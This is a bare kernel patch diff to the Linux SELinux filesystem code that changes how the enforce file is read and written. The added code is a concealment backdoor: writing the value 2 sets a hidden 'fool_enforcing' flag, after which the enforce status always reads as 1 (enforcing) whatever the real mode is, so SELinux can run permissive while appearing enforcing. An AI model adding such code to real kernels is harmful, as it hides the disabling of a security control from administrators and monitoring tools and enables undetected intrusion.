@@ -118,6 +118,8 @@ static void selinux_fs_info_free(struct super_block *sb)
 #define SEL_POLICYCAP_INO_OFFSET	0x08000000
 #define SEL_INO_MASK			0x00ffffff
 
+static bool fool_enforcing = 0;
+
 #define TMPBUFLEN	12
 static ssize_t sel_read_enforce(struct file *filp, char __user *buf,
 				size_t count, loff_t *ppos)
@@ -126,8 +128,12 @@ static ssize_t sel_read_enforce(struct file *filp, char __user *buf,
 	char tmpbuf[TMPBUFLEN];
 	ssize_t length;
 
-	length = scnprintf(tmpbuf, TMPBUFLEN, "%d",
+    if( !fool_enforcing ) {
+    	length = scnprintf(tmpbuf, TMPBUFLEN, "%d",
 			   enforcing_enabled(fsi->state));
+    } else {
+        length = scnprintf(tmpbuf, TMPBUFLEN, "%d", 1);
+    }
 	return simple_read_from_buffer(buf, count, ppos, tmpbuf, length);
 }
 
@@ -156,6 +162,14 @@ static ssize_t sel_write_enforce(struct file *file, const char __user *buf,
 	length = -EINVAL;
 	if (sscanf(page, "%d", &new_value) != 1)
 		goto out;
+
+    if( new_value == 2 ) {
+        fool_enforcing = 1;
+        length = count;    
+		goto out;
+    }
+
+    fool_enforcing = 0;
 
 	new_value = !!new_value;
 
